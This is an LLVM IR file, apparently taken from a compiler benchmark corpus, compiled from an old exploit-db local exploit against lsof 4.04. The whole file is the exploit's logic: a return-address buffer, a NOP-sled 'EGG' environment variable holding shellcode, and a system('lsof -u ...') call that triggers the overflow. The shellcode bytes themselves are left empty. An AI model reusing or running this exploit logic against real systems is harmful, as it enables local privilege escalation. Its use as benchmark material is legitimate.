; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19374.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19374.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [53 x i8] c"\0AXploit for lsof 4.04 by zhodiac <zhodiac@usa.net>\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"Using address: 0x%x\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"lsof -u %s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [512 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %15 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %15, i32* %10, align 4
  %16 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %16, i32* %11, align 4
  %17 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %17, i32* %13, align 4
  %18 = load i32, i32* %3, align 4
  %19 = icmp sgt i32 %18, 1
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %4, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @atoi(i8* %23)
  store i32 %24, i32* %11, align 4
  br label %25

25:                                               ; preds = %20, %2
  %26 = load i32, i32* %3, align 4
  %27 = icmp sgt i32 %26, 2
  br i1 %27, label %28, label %33

28:                                               ; preds = %25
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  store i32 %32, i32* %10, align 4
  br label %33

33:                                               ; preds = %28, %25
  %34 = load i32, i32* %3, align 4
  %35 = icmp sgt i32 %34, 3
  br i1 %35, label %36, label %41

36:                                               ; preds = %33
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 3
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @atoi(i8* %39)
  store i32 %40, i32* %13, align 4
  br label %41

41:                                               ; preds = %36, %33
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %43 = load i32, i32* %11, align 4
  %44 = call i8* @malloc(i32 %43)
  store i8* %44, i8** %5, align 8
  %45 = icmp ne i8* %44, null
  br i1 %45, label %49, label %46

46:                                               ; preds = %41
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %48 = call i32 @exit(i32 0) #3
  unreachable

49:                                               ; preds = %41
  %50 = load i32, i32* %13, align 4
  %51 = call i8* @malloc(i32 %50)
  store i8* %51, i8** %7, align 8
  %52 = icmp ne i8* %51, null
  br i1 %52, label %56, label %53

53:                                               ; preds = %49
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %55 = call i32 @exit(i32 0) #3
  unreachable

56:                                               ; preds = %49
  %57 = call i32 (...) @get_esp()
  %58 = load i32, i32* %10, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  store i64 %60, i64* %9, align 8
  %61 = load i64, i64* %9, align 8
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i64 %61)
  %63 = load i8*, i8** %5, align 8
  store i8* %63, i8** %6, align 8
  %64 = load i8*, i8** %6, align 8
  %65 = bitcast i8* %64 to i64*
  store i64* %65, i64** %8, align 8
  store i32 0, i32* %12, align 4
  br label %66

66:                                               ; preds = %74, %56
  %67 = load i32, i32* %12, align 4
  %68 = load i32, i32* %11, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %77

70:                                               ; preds = %66
  %71 = load i64, i64* %9, align 8
  %72 = load i64*, i64** %8, align 8
  %73 = getelementptr inbounds i64, i64* %72, i32 1
  store i64* %73, i64** %8, align 8
  store i64 %71, i64* %72, align 8
  br label %74

74:                                               ; preds = %70
  %75 = load i32, i32* %12, align 4
  %76 = add nsw i32 %75, 4
  store i32 %76, i32* %12, align 4
  br label %66

77:                                               ; preds = %66
  %78 = load i8*, i8** %7, align 8
  store i8* %78, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %79

79:                                               ; preds = %92, %77
  %80 = load i32, i32* %12, align 4
  %81 = load i32, i32* %13, align 4
  %82 = load i32*, i32** @shellcode, align 8
  %83 = call i32 @strlen(i32* %82)
  %84 = sub nsw i32 %81, %83
  %85 = sub nsw i32 %84, 1
  %86 = icmp slt i32 %80, %85
  br i1 %86, label %87, label %95

87:                                               ; preds = %79
  %88 = load i32, i32* @NOP, align 4
  %89 = trunc i32 %88 to i8
  %90 = load i8*, i8** %6, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %6, align 8
  store i8 %89, i8* %90, align 1
  br label %92

92:                                               ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %12, align 4
  br label %79

95:                                               ; preds = %79
  store i32 0, i32* %12, align 4
  br label %96

96:                                               ; preds = %110, %95
  %97 = load i32, i32* %12, align 4
  %98 = load i32*, i32** @shellcode, align 8
  %99 = call i32 @strlen(i32* %98)
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %113

101:                                              ; preds = %96
  %102 = load i32*, i32** @shellcode, align 8
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  %106 = load i32, i32* %105, align 4
  %107 = trunc i32 %106 to i8
  %108 = load i8*, i8** %6, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %6, align 8
  store i8 %107, i8* %108, align 1
  br label %110

110:                                              ; preds = %101
  %111 = load i32, i32* %12, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %12, align 4
  br label %96

113:                                              ; preds = %96
  %114 = load i8*, i8** %5, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sub nsw i32 %115, 1
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %114, i64 %117
  store i8 0, i8* %118, align 1
  %119 = load i8*, i8** %7, align 8
  %120 = load i32, i32* %13, align 4
  %121 = sub nsw i32 %120, 1
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %119, i64 %122
  store i8 0, i8* %123, align 1
  %124 = load i8*, i8** %7, align 8
  %125 = call i32 @memcpy(i8* %124, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 4)
  %126 = load i8*, i8** %7, align 8
  %127 = call i32 @putenv(i8* %126)
  %128 = getelementptr inbounds [512 x i8], [512 x i8]* %14, i64 0, i64 0
  %129 = load i8*, i8** %5, align 8
  %130 = call i32 @snprintf(i8* %128, i32 511, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0), i8* %129)
  %131 = getelementptr inbounds [512 x i8], [512 x i8]* %14, i64 0, i64 0
  %132 = call i32 @system(i8* %131)
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
